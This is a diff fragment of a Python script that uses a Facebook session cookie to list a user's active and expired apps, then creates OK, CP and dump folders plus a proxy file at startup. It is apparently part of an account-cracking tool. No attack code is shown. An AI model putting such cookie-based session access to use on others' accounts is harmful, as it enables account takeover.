+	x = sop.find("form",method="post")
+	game = [i.text for i in x.find_all("h3")]
+	try:
+		for i in range(len(game)):
+			print ("\r%s  \033[0m              ➛ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
+	except AttributeError:
+		print ("\r    %s\033[0m cookie invalid"%(M))
+	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
+	sop = bs4.BeautifulSoup(w,"html.parser")
+	x = sop.find("form",method="post")
+	game = [i.text for i in x.find_all("h3")]
+	try:
+		for i in range(len(game)):
+			print ("\r%s  \033[0m              ➛ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
+	except AttributeError:	 
+		print ("\r    %s \033[0mcookie invalid"%(M))
+if __name__=='__main__':
+	try:os.system('git pull')
+	except:pass
+	try:os.mkdir('OK')
+	except:pass
+	try:os.mkdir('CP')
+	except:pass
+	try:os.mkdir('/sdcard/ALVINO-DUMP')
+	except:pass
+	try:os.system('touch .prox.txt')
+	except:pass
+	try:os.system('pkg install play-audio')
+	except:pass
+	try:os.system('clear')
+	except:pass
+	
+	
+	main()
+	
+	
+	
+	
